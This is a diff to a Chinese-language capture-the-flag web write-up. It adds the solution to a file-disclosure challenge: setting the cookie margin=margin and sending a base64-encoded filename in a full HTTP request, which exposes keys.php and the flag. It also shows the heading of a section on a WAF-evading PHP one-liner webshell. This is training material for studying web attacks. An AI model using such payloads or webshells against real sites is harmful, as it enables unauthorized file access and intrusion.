@@ -438,7 +438,25 @@ echo $fa[$line];
 }
 ?>
 ```
-分析可知,如果ne
+分析可知,如果 cookie 设置了 margin 变量值为 margin,就将 keys.php 加到 file_list 数组中
+然后如果提交的文件名在该数组中,就显示该文件的内容
+由上构造 payload
+```
+GET /web11/index.php?line=&filename=a2V5cy5waHA= HTTP/1.1
+Host: 123.206.87.240:8002
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: margin=margin
+Connection: close
+```
+得到 flag
+## never give up
+
 ## 过狗一句话
 ```php
 <?php 
@@ -463,10 +481,10 @@ explode() 函数将 `$pos` 以 `#` 为界限打散装进 `$pos_1` 数组
 ![](https://upload-images.jianshu.io/upload_images/9172841-0b4859adfbdad510.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/702/format/webp)
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE1NTg2MTk4NjMsMTg2MjIyMTY1MywtMT
-E2MjQ5NTg4NCwxNjY0OTY3MTQ2LC0xODUzNzYzODQ4LC03OTkx
-MzIyNzIsLTE5NDkxNzMzMTgsNzk1NzE1NjI1LDQ1NDEyNTYyMy
-wtMTE3NzQwNzk0NiwtNzc5NjM0Nzg0LC02NDU3Nzk2MDYsMTQw
-MzIzNzE4MSwxNjU1NzgxNTMsNDg0NTM5NzgxLC0xMjE5MDU1MD
-M5LC0xNzQ1MDkyNjI4LC00Mjg3MjU4MDRdfQ==
+eyJoaXN0b3J5IjpbMTg3OTAyMDc2MywxODYyMjIxNjUzLC0xMT
+YyNDk1ODg0LDE2NjQ5NjcxNDYsLTE4NTM3NjM4NDgsLTc5OTEz
+MjI3MiwtMTk0OTE3MzMxOCw3OTU3MTU2MjUsNDU0MTI1NjIzLC
+0xMTc3NDA3OTQ2LC03Nzk2MzQ3ODQsLTY0NTc3OTYwNiwxNDAz
+MjM3MTgxLDE2NTU3ODE1Myw0ODQ1Mzk3ODEsLTEyMTkwNTUwMz
+ksLTE3NDUwOTI2MjgsLTQyODcyNTgwNF19
 -->
